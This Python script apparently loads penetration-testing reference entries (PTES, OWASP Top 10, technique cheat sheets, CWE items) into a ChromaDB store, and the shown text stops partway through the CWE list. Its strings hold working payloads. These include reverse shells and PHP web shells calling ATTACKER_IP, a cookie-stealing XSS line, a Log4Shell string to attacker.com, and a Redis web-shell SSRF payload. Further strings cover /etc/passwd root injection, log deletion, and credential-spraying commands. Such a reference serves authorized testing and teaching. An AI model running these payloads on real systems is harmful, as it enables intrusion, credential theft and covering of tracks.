#!/usr/bin/env python3
"""
Expand ChromaDB with additional high-quality pentest knowledge sources.
Sources: PTES, OWASP Cheat Sheets, CWE Top 25, SANS Top 25, NVD 2025,
         Pentest methodology guides, CVE/CVSS scoring reference, 
         Common pentest report templates.
"""
import os
import sys
import json
import time
import hashlib
import requests
import chromadb
from pathlib import Path

CHROMA_PATH = Path(__file__).parent.parent / "memory" / "chromadb"
client = chromadb.PersistentClient(str(CHROMA_PATH))

def safe_id(text: str, prefix: str = "") -> str:
    return prefix + hashlib.md5(text.encode()).hexdigest()[:16]

def add_collection_docs(collection_name: str, docs: list[dict], batch_size: int = 100):
    """Add documents to a ChromaDB collection, skipping existing IDs."""
    try:
        col = client.get_or_create_collection(
            name=collection_name,
            metadata={"hnsw:space": "cosine"}
        )
    except Exception as e:
        print(f"[ERROR] Failed to get/create {collection_name}: {e}")
        return 0

    existing = set(col.get(include=[])["ids"])
    new_docs = [d for d in docs if d["id"] not in existing]

    if not new_docs:
        print(f"  [SKIP] {collection_name}: all {len(docs)} docs already exist")
        return 0

    added = 0
    for i in range(0, len(new_docs), batch_size):
        batch = new_docs[i:i + batch_size]
        try:
            col.add(
                ids=[d["id"] for d in batch],
                documents=[d["document"] for d in batch],
                metadatas=[d["metadata"] for d in batch],
            )
            added += len(batch)
        except Exception as e:
            print(f"  [WARN] Batch {i//batch_size} failed: {e}")

    print(f"  [OK] {collection_name}: +{added} new docs (total: {col.count()})")
    return added


# ─── SOURCE 1: PTES (Penetration Testing Execution Standard) ─────────────────

PTES_KNOWLEDGE = [
    {
        "id": "ptes-01-preengagement",
        "document": """PTES Pre-Engagement Interactions
Scope Definition: Define target IP ranges, domains, excluded systems, authorized attack types (black/grey/white box).
Rules of Engagement: Hours of testing, communication protocol, emergency contacts, escalation path.
Legal Documentation: Written authorization (get-out-of-jail letter), NDA, liability waiver.
Threat Modeling: Identify assets, threat actors, attack scenarios relevant to the target.
Information Gathering Kickoff: Client questionnaire - existing security controls, known vulnerabilities, previous pentest reports.
Key deliverable: Signed scope document with explicit IP/domain list.""",
        "metadata": {"source": "PTES", "section": "pre-engagement", "phase": "recon"}
    },
    {
        "id": "ptes-02-intelligence",
        "document": """PTES Intelligence Gathering (Reconnaissance)
OSINT Techniques:
- Corporate: LinkedIn (employees, org structure), job postings (tech stack), WHOIS, DNS records
- Technical: Shodan/Censys (exposed services), Netcraft (hosting history), BuiltWith (web technologies)
- Email: theHarvester, Hunter.io patterns (firstname.lastname@company.com)
- DNS: Sublist3r, amass, subfinder for subdomain enumeration; zone transfer attempt (AXFR)
- Certificate Transparency: crt.sh, certspotter for subdomain discovery
Active Reconnaissance:
- Nmap host discovery: nmap -sn 10.0.0.0/24
- Ping sweep: fping -a -g 10.0.0.0/24
- Live host port scan: nmap -sS -T4 -p- <target>
Deliverables: IP range map, technology fingerprint, employee list, email patterns""",
        "metadata": {"source": "PTES", "section": "intelligence-gathering", "phase": "recon"}
    },
    {
        "id": "ptes-03-threat-modeling",
        "document": """PTES Threat Modeling
Asset Identification: Web apps, databases, network devices, endpoints, mobile, cloud, IoT, VoIP
Attack Profiling: Opportunistic attacker vs. targeted APT vs. insider threat
Threat Modeling Methodologies: STRIDE (Spoofing, Tampering, Repudiation, Info Disclosure, Denial, Elevation), DREAD scoring
Attack Surface Matrix:
- External: Internet-facing web apps, VPN portals, email servers, public APIs
- Internal: Domain controllers, file servers, databases, legacy systems
- Physical: USB drops, tailgating, social engineering
Priority: Focus on Crown Jewels (highest-value assets first)""",
        "metadata": {"source": "PTES", "section": "threat-modeling", "phase": "recon"}
    },
    {
        "id": "ptes-04-vulnerability",
        "document": """PTES Vulnerability Research and Verification
Research Methods:
- Automated scanning: Nessus, OpenVAS, Qualys, nuclei for rapid baseline
- Manual verification: ALWAYS manually verify scanner findings to eliminate false positives
- CVE lookup: NVD, ExploitDB, PacketStorm for known vulnerabilities by service/version
- Configuration review: Default credentials, unnecessary services, missing patches
CVSS v3.1 Scoring:
- Critical: 9.0-10.0 (Remote code execution, no auth, widespread impact)
- High: 7.0-8.9 (Significant data exposure or system compromise)
- Medium: 4.0-6.9 (Requires authentication or limited impact)
- Low: 0.1-3.9 (Minimal impact, difficult to exploit)
Verification Steps: Reproduce finding → Document proof → Rate severity → Map to MITRE ATT&CK""",
        "metadata": {"source": "PTES", "section": "vulnerability-research", "phase": "vuln"}
    },
    {
        "id": "ptes-05-exploitation",
        "document": """PTES Exploitation
Exploitation Approach:
1. Prioritize highest CVSS + lowest complexity first
2. Attempt non-destructive exploits before disruptive ones
3. Document every exploit attempt (success AND failure) for the report
4. Establish stable shell before lateral movement
Exploitation Techniques by Category:
Web: SQLi, XSS, CSRF, SSRF, XXE, File Upload, Deserialization, SSTI, Path Traversal
Network: Service exploits (Metasploit), Buffer overflow, SMB relay, NTLM capture
Credentials: Brute force (Hydra), Password spray (crackmapexec), Default creds, Hash cracking
Social: Phishing, Pretexting, Vishing (if in scope)
Post-Shell: id; whoami; uname -a; cat /etc/passwd; ss -tlnp; ps aux""",
        "metadata": {"source": "PTES", "section": "exploitation", "phase": "exploit"}
    },
    {
        "id": "ptes-06-postexploit",
        "document": """PTES Post-Exploitation
Immediate Actions After Shell:
1. Stabilize shell: python3 -c 'import pty; pty.spawn("/bin/bash")' then Ctrl+Z, stty raw -echo; fg
2. Gather local info: id, hostname, uname -a, ip a, ss -tlnp, cat /etc/passwd
3. Search for credentials: grep -r "password" /etc/. /var/www/ 2>/dev/null; find / -name "*.conf" 2>/dev/null
4. Check sudo: sudo -l
5. Run LinPEAS for automated PrivEsc discovery
Lateral Movement:
- SSH key theft and reuse
- Password hash dumping + cracking
- Pass-the-hash (Windows): impacket-smbclient, crackmapexec
- Pivoting: SSH tunneling, chisel, ligolo-ng
Persistence (document only): Crontab, SSH keys, web shell, systemd service""",
        "metadata": {"source": "PTES", "section": "post-exploitation", "phase": "postexploit"}
    },
    {
        "id": "ptes-07-reporting",
        "document": """PTES Reporting Standard
Report Structure:
1. Executive Summary (non-technical, business risk language, 1-2 pages)
2. Scope and Methodology (what was tested, how, when)
3. Risk Rating Summary (Critical/High/Medium/Low/Informational counts)
4. Detailed Findings:
   - Finding title
   - CVSS v3.1 score + vector string
   - Affected systems
   - Description (what the vulnerability is)
   - Evidence (screenshots, command output, payload used)
   - MITRE ATT&CK technique ID
   - Business impact
   - Remediation recommendation (specific, actionable)
5. Attack Chain / Kill Chain narrative
6. Appendix: Raw scan output, tool versions, CVE references
Report Quality Standards:
- Every finding must have EVIDENCE (output, screenshot)
- Remediation must be SPECIFIC (patch version, config change, not "update software")
- CVSS must use proper v3.1 vector string: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H""",
        "metadata": {"source": "PTES", "section": "reporting", "phase": "report"}
    },
]

# ─── SOURCE 2: OWASP Top 10 2021 (Web Application Security) ──────────────────

OWASP_TOP10_2021 = [
    {
        "id": "owasp-a01-broken-access",
        "document": """OWASP A01:2021 - Broken Access Control (Most Critical)
Description: Access control enforces policy such that users cannot act outside their intended permissions.
Failures lead to unauthorized access, modification, or destruction of data.
Attack Techniques:
- IDOR (Insecure Direct Object Reference): /api/user/1 → try /api/user/2 for other users' data
- Privilege escalation: changing role parameter, manipulating JWT claims
- Forced browsing: accessing /admin, /config without authorization
- CORS misconfiguration: null origin bypass, wildcard with credentials
- Path traversal to access unauthorized files
Detection: Burp Suite Repeater for IDOR, Authorize extension for privilege escalation testing
MITRE: T1078 (Valid Accounts), T1548 (Abuse Elevation Control Mechanism)
CVEs: CVE-2019-11043 (PHP-FPM), CVE-2021-22986 (F5 BIG-IP unauthenticated RCE)
Remediation: Deny by default, server-side enforcement, log access failures, rate limit API""",
        "metadata": {"source": "OWASP", "category": "A01:2021", "phase": "exploit", "severity": "critical"}
    },
    {
        "id": "owasp-a02-crypto",
        "document": """OWASP A02:2021 - Cryptographic Failures
Description: Failures related to cryptography which often lead to sensitive data exposure.
Common Issues:
- Data transmitted in cleartext (HTTP, FTP, SMTP without STARTTLS)
- Weak/deprecated algorithms: MD5, SHA1, DES, RC4, RSA < 2048-bit
- Hardcoded keys or passwords in source code
- Missing certificate validation (allows MITM)
- Weak password hashing: unsalted MD5, SHA1 for passwords
Detection Commands:
- SSL/TLS scan: sslscan <target>; testssl.sh <target>
- Check HTTP: curl -v http://<target> (no redirect to HTTPS?)
- Certificate info: openssl s_client -connect target:443
Attack: Downgrade attacks, BEAST (CVE-2011-3389), POODLE (CVE-2014-3566), DROWN (CVE-2016-0800)
Remediation: TLS 1.2+ only, HSTS, bcrypt/scrypt/Argon2 for passwords, no MD5/SHA1""",
        "metadata": {"source": "OWASP", "category": "A02:2021", "phase": "vuln", "severity": "high"}
    },
    {
        "id": "owasp-a03-injection",
        "document": """OWASP A03:2021 - Injection (SQL, NoSQL, OS, LDAP, SSTI)
SQL Injection Attack Techniques:
- Error-based: ' OR '1'='1; UNION SELECT null,null,null--
- Blind: ' AND SLEEP(5)--; ' AND 1=1-- vs ' AND 1=2--
- Time-based: ' AND SLEEP(5)-- (MySQL); '; WAITFOR DELAY '0:0:5'-- (MSSQL)
- Out-of-band: INTO OUTFILE, LOAD_FILE, xp_cmdshell (MSSQL RCE)
SQLMap Commands:
- Basic: sqlmap -u "http://target/page?id=1" --dbs
- POST: sqlmap -u "http://target/login" --data "user=a&pass=b" -p user
- Cookie: sqlmap -u "http://target/" --cookie "session=abc" --level=3
OS Command Injection: ; id; | whoami; `id`; $(id); %0aid
SSTI (Template Injection): {{7*7}} → 49 means vulnerable; {{''.__class__.__mro__[1].__subclasses__()}}
LDAP Injection: *)(uid=*))(|(uid=*; bypass authentication
NoSQL Injection: {"$gt": ""} for MongoDB; {"$ne": null}
MITRE: T1190 (Exploit Public-Facing Application)""",
        "metadata": {"source": "OWASP", "category": "A03:2021", "phase": "exploit", "severity": "critical"}
    },
    {
        "id": "owasp-a04-insecure-design",
        "document": """OWASP A04:2021 - Insecure Design
Description: Design flaws that cannot be patched by perfect implementation.
Examples:
- Password reset via security questions (guessable answers)
- No rate limiting on credential brute force
- Sensitive data in URL parameters (logged by proxies/servers)
- Trust boundary violations between tiers
- Race conditions in financial operations
Testing Techniques:
- Business logic testing: negative quantities, price manipulation, workflow bypass
- Race conditions: Turbo Intruder (Burp extension) for concurrent requests
- API abuse: discover undocumented API endpoints via JS analysis, Swagger endpoints
- Feature flag bypass: manipulate hidden parameters
Reconnaissance for design flaws: Source code review (if white-box), JS file analysis, API schema enumeration""",
        "metadata": {"source": "OWASP", "category": "A04:2021", "phase": "vuln", "severity": "high"}
    },
    {
        "id": "owasp-a05-security-misconfig",
        "document": """OWASP A05:2021 - Security Misconfiguration
Common Misconfigurations:
- Default credentials (admin/admin, admin/password, root/root, guest/guest)
- Exposed admin interfaces (/admin, /manager, /console, /.git, /phpmyadmin)
- Directory listing enabled
- Unnecessary services and ports open
- Missing security headers (X-Frame-Options, CSP, HSTS, X-XSS-Protection)
- Cloud misconfiguration: S3 bucket public, Azure blob storage world-readable
Detection Commands:
- nikto -h http://target (comprehensive web misconfig scanner)
- curl -I http://target (check response headers)
- gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
- Default creds: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <service>
- XXE via default config: look for XML parsers accepting external entities
Common Default Creds: Tomcat (tomcat/tomcat, admin/admin), Jenkins (admin/admin), 
  Grafana (admin/admin), MySQL (root/root), PostgreSQL (postgres/postgres), 
  Cisco (cisco/cisco), Juniper (netscreen/netscreen), Fortinet (admin/no-password)""",
        "metadata": {"source": "OWASP", "category": "A05:2021", "phase": "enum", "severity": "high"}
    },
    {
        "id": "owasp-a06-vulnerable-components",
        "document": """OWASP A06:2021 - Vulnerable and Outdated Components
Key CVEs to Check by Technology:
Apache: CVE-2021-41773 (Path Traversal, CVSS 9.8), CVE-2021-42013 (RCE), CVE-2017-7679
Log4j: CVE-2021-44228 Log4Shell (CVSS 10.0) - ${jndi:ldap://attacker.com/x}
Spring: CVE-2022-22965 Spring4Shell (CVSS 9.8), CVE-2022-22963 (CVSS 9.8)
Struts: CVE-2017-5638 (Equifax breach, CVSS 10.0)
OpenSSL: CVE-2014-0160 Heartbleed (CVSS 7.5), CVE-2022-0778 (infinite loop)
Sudo: CVE-2021-3156 Baron Samedit (CVSS 7.8, local PrivEsc)
Polkit: CVE-2021-4034 PwnKit (CVSS 7.8, local PrivEsc)
Detection: searchsploit <service> <version>; nuclei -t cves/ -u http://target
Version Detection: nmap -sV --version-intensity 9; WhatWeb; wappalyzer; curl headers""",
        "metadata": {"source": "OWASP", "category": "A06:2021", "phase": "vuln", "severity": "critical"}
    },
    {
        "id": "owasp-a07-authn-failures",
        "document": """OWASP A07:2021 - Identification and Authentication Failures
Attack Techniques:
- Credential stuffing: Use breached credentials from haveibeenpwned datasets
- Brute force: hydra -l admin -P rockyou.txt http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
- Password spray: 1 password against many users (avoids lockout)
- JWT attacks: None algorithm (change alg to none, remove signature), weak secret brute force, kid injection
- Session fixation: attacker sets session ID before login, user authenticates with it
- Session hijacking: steal cookie via XSS, sniffing
JWT Testing:
- Decode: base64 -d (header.payload)
- None alg: {"alg":"none"}
- Weak secret: hashcat -a 0 -m 16500 <jwt> rockyou.txt
- RS256→HS256 confusion: sign with public key as HMAC secret
Tools: jwt_tool, hydra, burpsuite repeater, wfuzz""",
        "metadata": {"source": "OWASP", "category": "A07:2021", "phase": "exploit", "severity": "high"}
    },
    {
        "id": "owasp-a08-ssrf",
        "document": """OWASP A08:2021 - Software and Data Integrity Failures / SSRF
SSRF (Server-Side Request Forgery) Techniques:
- Basic SSRF: ?url=http://169.254.169.254/latest/meta-data/ (AWS metadata)
- Blind SSRF: out-of-band detection via Burp Collaborator or interactsh
- Cloud metadata endpoints:
  AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/
  GCP: http://metadata.google.internal/computeMetadata/v1/
  Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
- SSRF to internal services: http://127.0.0.1:8080, http://localhost/admin
- URL bypass: http://127.1, http://0177.0.0.1, http://0x7f000001, http://[::1]
- DNS rebinding: attacker DNS resolves to 127.0.0.1 after whitelist check
Deserialization:
- Java: ysoserial payloads; CommonsCollections, Spring gadgets
- PHP: unserialize() with magic methods (__wakeup, __destruct)
- Python: pickle.loads() arbitrary code execution
Detection: Look for URL/IP parameters, webhooks, PDF generators, image fetch features""",
        "metadata": {"source": "OWASP", "category": "A08:2021", "phase": "exploit", "severity": "high"}
    },
    {
        "id": "owasp-a09-logging",
        "document": """OWASP A09:2021 - Security Logging and Monitoring Failures
Attacker Perspective: Poor logging means longer dwell time before detection.
Log Evasion Techniques:
- Slow and low attacks (avoid rate-based detection)
- Use legitimate user agents (curl --user-agent "Mozilla/5.0...")
- Source IP rotation via proxies/VPN/Tor
- Off-hours attacks (less monitoring at 3 AM)
- Timestomping: touch -t 202001010000 /tmp/evil.sh
- Log deletion: rm /var/log/auth.log; echo "" > /var/log/apache2/access.log
What Attackers Look For (poor logging indicators):
- Login failures not logged
- No alerting on multiple 4xx errors
- Admin access not logged
- No SIEM correlation rules
Testing: Generate obvious attacks, check if alerts fire; look for unprotected log files""",
        "metadata": {"source": "OWASP", "category": "A09:2021", "phase": "postexploit", "severity": "medium"}
    },
    {
        "id": "owasp-a10-ssrf-2",
        "document": """OWASP A10:2021 - Server-Side Request Forgery (SSRF)
See A08 for SSRF techniques. Additional vectors:
- PDF generation: HTML injection → SSRF via <img src="http://internal/">
- XML parsers: XXE → SSRF via <!ENTITY xxe SYSTEM "http://internal/admin">
- File upload: SVG files with external entity references
- Webhooks: Redirect webhook URL to internal service
- Protocol smuggling: gopher://, dict://, file:// schemes in SSRF
Gopher SSRF for Redis RCE:
gopher://127.0.0.1:6379/_SET%20test%20"<%3fphp%20system($_GET[cmd])%3b%20%3f>"\r\nCONFIG%20SET%20dir%20/var/www/html\r\n
SSRF Filter Bypass:
- Decimal IP: http://2130706433/ (127.0.0.1)
- IPv6: http://[::ffff:127.0.0.1]/
- URL encoding: http://127.0.0.1%2F%40evil.com/
- Double encoding, Unicode normalization""",
        "metadata": {"source": "OWASP", "category": "A10:2021", "phase": "exploit", "severity": "high"}
    },
]

# ─── SOURCE 3: Common Pentest Techniques Reference ────────────────────────────

PENTEST_TECHNIQUES = [
    {
        "id": "tech-nmap-master",
        "document": """Nmap Master Reference — All Essential Scan Types
HOST DISCOVERY:
nmap -sn 192.168.1.0/24                          # Ping sweep, no port scan
nmap -PE -PP -PM -sn 192.168.1.0/24             # ICMP echo/timestamp/netmask

PORT SCANNING:
nmap -sS -T4 -p- --open <target>                 # Full TCP SYN scan, open only
nmap -sU -T4 --top-ports 200 <target>            # Top 200 UDP ports
nmap -sS -sU -T4 -p U:53,161,T:80,443 <target>  # Combined TCP+UDP

SERVICE/VERSION/OS:
nmap -sV --version-intensity 9 -O <target>        # Aggressive version + OS
nmap -sC -sV -O -p- --script=default <target>     # Default NSE + version + OS

NSE SCRIPTS:
nmap --script vuln <target>                        # Vulnerability detection
nmap --script=smb-vuln-ms17-010 <target>          # EternalBlue check
nmap --script=http-shellshock <target>             # Shellshock check
nmap --script=ftp-anon,ftp-bounce <target>         # FTP anonymous login
nmap --script=smtp-enum-users --script-args smtp-enum-users.methods=VRFY <target>

OUTPUT:
nmap -oA output_base <target>                      # All formats (normal/XML/grepable)
nmap -oX scan.xml <target> && xsltproc scan.xml -o scan.html  # HTML report""",
        "metadata": {"source": "pentest-reference", "tool": "nmap", "phase": "recon,enum"}
    },
    {
        "id": "tech-privesc-linux",
        "document": """Linux Privilege Escalation — Complete Reference
INITIAL ENUMERATION:
id; whoami; uname -a; cat /etc/os-release; hostname
ip a; ss -tlnp; netstat -tunlp
ps aux | grep root
cat /etc/crontab; ls -la /etc/cron.*
find / -perm -4000 -type f 2>/dev/null              # SUID files
find / -perm -2000 -type f 2>/dev/null              # SGID files
sudo -l                                              # Sudo permissions
cat /etc/sudoers 2>/dev/null

SUID/GTFOBins EXPLOITATION:
find / -perm /4000 2>/dev/null | xargs ls -la
# Example: SUID vim → vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh","-p")'
# Example: SUID find → find . -exec /bin/sh -p \; -quit
# Example: SUID python → python -c 'import os; os.setuid(0); os.system("/bin/bash")'
# Full list: https://gtfobins.github.io/

SUDO EXPLOITATION:
# sudo vim → :!bash or :shell
# sudo less → !bash
# sudo awk → awk 'BEGIN {system("/bin/bash")}'
# sudo python → sudo python -c 'import os; os.system("/bin/bash")'

KERNEL EXPLOITS:
# DirtyPipe (CVE-2022-0847) → Linux 5.8-5.16.11, CVSS 7.8
# DirtyCow (CVE-2016-5195) → Linux < 4.8.3, CVSS 7.8
# PwnKit/Polkit (CVE-2021-4034) → pkexec SUID, all Linux distros, CVSS 7.8
# Baron Samedit (CVE-2021-3156) → sudo < 1.9.5p2, CVSS 7.8

CRON JOB ABUSE:
cat /etc/crontab; ls /etc/cron.d/; crontab -l
# If writable script in cron: echo 'chmod +s /bin/bash' >> /path/cron_script.sh
# If writable PATH directory used by cron: create malicious file at start of PATH

WRITABLE /etc/passwd:
openssl passwd -1 -salt xyz hacked123              # Generate hash
echo 'hacker:$1$xyz$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd""",
        "metadata": {"source": "pentest-reference", "technique": "linux-privesc", "phase": "privesc"}
    },
    {
        "id": "tech-web-payloads",
        "document": """Web Exploitation Payload Reference
SQL INJECTION PAYLOADS:
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
admin'--
1' ORDER BY 1--
1' UNION SELECT null,null--
1' UNION SELECT table_name,null FROM information_schema.tables--
' AND SLEEP(5)--                    # MySQL time-based blind
'; WAITFOR DELAY '0:0:5'--          # MSSQL time-based blind

XSS PAYLOADS:
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)
"><script>document.location='http://attacker/steal?c='+document.cookie</script>

LFI PAYLOADS:
../../../../etc/passwd
....//....//....//etc/passwd
%2F%2F%2F%2F%2F..%2F..%2F..%2Fetc%2Fpasswd
/proc/self/environ (may execute if user-agent in env)
php://filter/convert.base64-encode/resource=/etc/passwd  # PHP wrapper

COMMAND INJECTION:
; id
| id
&& id
`id`
$(id)
;id;
\nid\n

DIRECTORY TRAVERSAL:
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
....//....//etc/passwd

FILE UPLOAD BYPASS:
- Change Content-Type: image/jpeg for .php file
- Double extension: shell.php.jpg
- Null byte: shell.php%00.jpg
- Magic bytes: add GIF89a; before PHP code""",
        "metadata": {"source": "pentest-reference", "technique": "web-payloads", "phase": "exploit"}
    },
    {
        "id": "tech-voip-pentest",
        "document": """VoIP Penetration Testing Reference
SIP PROTOCOL BASICS:
- Default ports: UDP/TCP 5060 (SIP), 5061 (SIP-TLS), UDP 10000-20000 (RTP/media)
- Components: UA (User Agent), Proxy, Registrar, Redirect Server
- Methods: REGISTER, INVITE, BYE, CANCEL, OPTIONS, ACK, SUBSCRIBE, NOTIFY

ENUMERATION TOOLS:
svmap 192.168.1.0/24                               # Discover SIP devices
svwar -e100-300 192.168.1.1                        # Enumerate extensions 100-300
svcrack -u200 -P rockyou.txt 192.168.1.1           # Brute force SIP credentials
sipvicious-ng                                      # Modern SIPVicious

NMAP SIP SCRIPTS:
nmap -sU -p 5060 --script sip-enum-users <target>
nmap -sU -p 5060 --script sip-methods <target>

ATTACK TECHNIQUES:
1. Extension Enumeration: 401 Unauthorized = extension exists; 404 = not found
2. Registration Hijacking: Re-register victim extension to attacker IP
3. Call Interception: Capture RTP streams with wireshark/sngrep
4. Toll Fraud: Make international calls using stolen credentials
5. Denial of Service: SIP flood, malformed INVITE messages
6. VLAN Hopping: Access voice VLAN from data VLAN (802.1Q double-tagging)

CREDENTIAL ATTACKS:
hydra -l 200 -P rockyou.txt <target> sip
svcrack -u200 -d wordlist.txt <target>

METASPLOIT MODULES:
use auxiliary/scanner/sip/options                  # SIP OPTIONS scan
use auxiliary/scanner/sip/enumerator               # Extension enum
use auxiliary/voip/sip_invite_spoof               # INVITE spoofing""",
        "metadata": {"source": "pentest-reference", "technique": "voip-pentest", "phase": "enum,exploit"}
    },
    {
        "id": "tech-active-directory",
        "document": """Active Directory Penetration Testing Reference
ENUMERATION (External → Internal):
# Unauthenticated:
nmap -sV -p 88,135,139,389,445,3268,5985 <DC-IP>    # Key AD ports
crackmapexec smb <subnet>/24                          # SMB hosts + info
ldapsearch -x -H ldap://<DC> -b "DC=domain,DC=com"  # Anonymous LDAP

# Authenticated (valid domain user required):
bloodhound-python -u user -p pass -d domain.com -ns <DC>   # Graph AD
impacket-GetADUsers -all domain.com/user:pass -dc-ip <DC>  # All users
ldapdomaindump -u 'DOMAIN\\user' -p pass <DC>               # Full LDAP dump

CREDENTIAL ATTACKS:
# Password Spray (low and slow to avoid lockout):
crackmapexec smb <DC> -u users.txt -p 'Password123!' --continue-on-success

# Kerberoasting (service ticket hash capture):
impacket-GetUserSPNs domain.com/user:pass -dc-ip <DC> -request
hashcat -a 0 -m 13100 kerberos.hashes rockyou.txt

# ASREPRoasting (no pre-auth required):
impacket-GetNPUsers domain.com/ -usersfile users.txt -dc-ip <DC>

LATERAL MOVEMENT:
crackmapexec smb <subnet>/24 -u user -H <NTLM-hash>   # Pass-the-hash
impacket-wmiexec domain/user:pass@<target>             # WMI execution
impacket-psexec domain/user:pass@<target>              # PsExec
evil-winrm -i <target> -u user -p pass                 # WinRM shell

DOMAIN DOMINANCE:
impacket-secretsdump domain/user:pass@<DC>   # DCSync (Domain Admin required)
impacket-ticketer -nthash <krbtgt-hash> -domain-sid S-1-5-21-... -domain domain.com Administrator  # Golden Ticket""",
        "metadata": {"source": "pentest-reference", "technique": "active-directory", "phase": "enum,exploit,privesc"}
    },
    {
        "id": "tech-reverse-shells",
        "document": """Reverse Shell Reference — All Languages and Methods
BASH:
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/4444; sh <&196 >&196 2>&196

PYTHON:
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

PHP:
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
<?php system($_GET['cmd']); ?>                         # Web shell (GET)
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>

PERL:
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

NETCAT:
nc -e /bin/sh ATTACKER_IP 4444                        # Traditional nc
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444>/tmp/f  # No -e nc

SHELL STABILIZATION (after catching shell):
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then: Ctrl+Z → stty raw -echo → fg → export TERM=xterm
stty rows 50 columns 200

LISTENER SETUP:
nc -lvnp 4444                                          # Basic netcat listener
rlwrap nc -lvnp 4444                                   # With readline support
socat file:`tty`,raw,echo=0 tcp-listen:4444            # Full TTY via socat""",
        "metadata": {"source": "pentest-reference", "technique": "reverse-shells", "phase": "exploit"}
    },
    {
        "id": "tech-password-attacks",
        "document": """Password Attack Reference — Hydra, Hashcat, John
HYDRA SYNTAX:
hydra -l admin -P rockyou.txt ssh://192.168.1.1
hydra -L users.txt -P passwords.txt ftp://192.168.1.1
hydra -l admin -P rockyou.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid credentials"
hydra -l admin -P rockyou.txt -s 8080 192.168.1.1 http-get /admin
hydra -l sa -P rockyou.txt mssql://192.168.1.1
hydra -l root -P rockyou.txt mysql://192.168.1.1

HASHCAT MODES:
hashcat -a 0 -m 0 hashes.txt rockyou.txt             # MD5 dictionary
hashcat -a 0 -m 1000 ntlm.txt rockyou.txt            # NTLM (Windows)
hashcat -a 0 -m 1800 sha512crypt.txt rockyou.txt     # Linux /etc/shadow SHA512
hashcat -a 0 -m 3200 bcrypt.txt rockyou.txt          # bcrypt
hashcat -a 0 -m 13100 kerberos.txt rockyou.txt       # Kerberos TGS (Kerberoast)
hashcat -a 3 -m 1000 ntlm.txt '?u?l?l?l?d?d?d?s'   # Mask attack

JOHN THE RIPPER:
john --wordlist=rockyou.txt hashes.txt
john --format=NT hashes.txt                          # NTLM
unshadow /etc/passwd /etc/shadow > combined.txt && john combined.txt

COMMON DEFAULT CREDENTIALS (check these first!):
admin:admin, admin:password, admin:123456, root:root, root:toor
guest:guest, test:test, user:user, administrator:admin
cisco:cisco, netscreen:netscreen, juniper:juniper
tomcat:tomcat, manager:manager, admin:tomcat""",
        "metadata": {"source": "pentest-reference", "technique": "password-attacks", "phase": "exploit"}
    },
]

# ─── SOURCE 4: CWE Top 25 Most Dangerous Software Weaknesses (2023) ───────────

CWE_TOP25 = [
    {"id": f"cwe-{cwe_id}", "document": doc, "metadata": {"source": "CWE-Top25", "cwe_id": cwe_id, "phase": "vuln"}}
    for cwe_id, doc in [
        ("CWE-787", "CWE-787: Out-of-bounds Write (Rank #1, 2023). Writing data past end of allocated buffer. Leads to code execution, crash, data corruption. Common in C/C++. Detection: fuzzing, static analysis. CVSS often Critical. Examples: CVE-2021-44228 (Log4Shell), buffer overflow exploits. Mitigation: bounds checking, use memory-safe languages, AddressSanitizer."),
        ("CWE-79", "CWE-79: Cross-site Scripting XSS (Rank #2, 2023). Improper neutralization of user input in web page output. Types: Stored (persists in DB), Reflected (URL-based), DOM-based (client-side). Impact: session theft, credential harvesting, defacement, malware distribution. Detection: manual testing, burpsuite scanner. Payload: <script>alert(document.cookie)</script>. Mitigation: output encoding (HTMLEncode), Content Security Policy, HTTPOnly cookies."),
        ("CWE-89", "CWE-89: SQL Injection (Rank #3, 2023). User input incorporated into SQL queries without proper sanitization. Types: Error-based, Union-based, Blind (Boolean/Time). Impact: data theft, authentication bypass, RCE via xp_cmdshell. Tools: sqlmap, manual testing. Detection: ' or 1=1-- in fields. Mitigation: parameterized queries, prepared statements, ORM, least privilege DB user."),
        ("CWE-416", "CWE-416: Use After Free (Rank #4, 2023). Memory accessed after being freed/deallocated. Common in browsers, PDF readers, media parsers. Leads to code execution. CVEs: many browser 0-days. Detection: valgrind, AddressSanitizer, fuzzing. Mitigation: smart pointers (C++), garbage collection, memory-safe languages."),
        ("CWE-78", "CWE-78: OS Command Injection (Rank #5, 2023). User input passed to OS shell without sanitization. Payloads: ; id, | whoami, && cat /etc/passwd, $(id), `id`. Impact: RCE as web server user (www-data). Detection: test special characters in all input fields. Mitigation: avoid shell calls, use execve() family, whitelist input validation."),
        ("CWE-20", "CWE-20: Improper Input Validation (Rank #6, 2023). Root cause of many vulnerabilities. All input must be validated: type, length, format, range. Detection: send unexpected input (negative numbers, large strings, binary data, special chars). Impact: varies by context (DoS, injection, bypass). Mitigation: allowlist validation, strict type checking, reject unexpected input early."),
        ("CWE-125", "CWE-125: Out-of-bounds Read (Rank #7, 2023). Reading past end of allocated buffer. Leads to information disclosure, crash. CVE-2014-0160 Heartbleed is a famous example (OpenSSL). Detection: fuzzing, static analysis. Mitigation: bounds checking, safe string functions (strlcpy instead of strcpy)."),
